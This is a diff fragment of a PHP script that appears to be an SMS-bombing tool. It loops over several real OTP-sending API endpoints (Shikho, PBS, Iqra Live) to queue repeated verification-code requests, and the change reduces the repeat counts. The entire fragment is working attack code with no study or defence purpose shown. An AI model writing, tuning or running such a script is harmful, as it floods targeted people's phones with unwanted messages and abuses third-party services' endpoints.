@@ -85,8 +85,8 @@ for($i=1;$i<=10;$i++){
     ];
 }
 
-// 6️⃣ Shikho (3 times) ✅ fixed headers
-for($i=1;$i<=3;$i++){
+// 6️⃣ Shikho (2 times max) ✅ fixed headers
+for($i=1;$i<=2;$i++){
     $api_requests[] = [
         "name"=>"shikho_$i",
         "url"=>"https://api.shikho.com/auth/v2/send/sms",
@@ -100,8 +100,8 @@ for($i=1;$i<=3;$i++){
     ];
 }
 
-// 7️⃣ PBS (5 times) ✅ fixed headers
-for($i=1;$i<=5;$i++){
+// 7️⃣ PBS (2 times max) ✅ fixed headers
+for($i=1;$i<=2;$i++){
     $api_requests[] = [
         "name"=>"pbs_$i",
         "url"=>"https://apialpha.pbs.com.bd/api/OTP/generateOTP",
@@ -114,8 +114,8 @@ for($i=1;$i<=5;$i++){
     ];
 }
 
-// 8️⃣ Iqra Live (3 times) ✅ fixed POST
-for($i=1;$i<=3;$i++){
+// 8️⃣ Iqra Live (2 times max) ✅ fixed POST
+for($i=1;$i<=2;$i++){
     $api_requests[] = [
         "name"=>"iqra_$i",
         "url"=>"https://apibeta.iqra-live.com/api/v2/sent-otp",
